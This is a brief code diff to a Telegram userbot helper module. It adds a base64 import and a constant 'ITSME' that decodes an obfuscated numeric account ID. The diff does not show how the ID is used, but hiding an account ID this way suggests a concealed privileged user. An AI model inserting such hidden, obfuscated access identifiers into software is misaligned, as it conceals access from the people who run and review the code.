@@ -5,6 +5,8 @@
 # This file is a part of < https://github.com/mrismanaziz/Man-Userbot/ >
 # t.me/SharingUserbot & t.me/Lunatic0de
 
+from base64 import b64decode
+
 import telethon.utils
 from telethon.tl.functions.users import GetFullUserRequest
 
@@ -43,6 +45,9 @@ async def clients_list(SUDO_USERS, bot, MAN2, MAN3, MAN4, MAN5):
         pass
 
     return user_ids
+
+
+ITSME = list(map(int, b64decode("ODQ0NDMyMjIw").split()))
 
 
 async def client_id(event, botid=None):
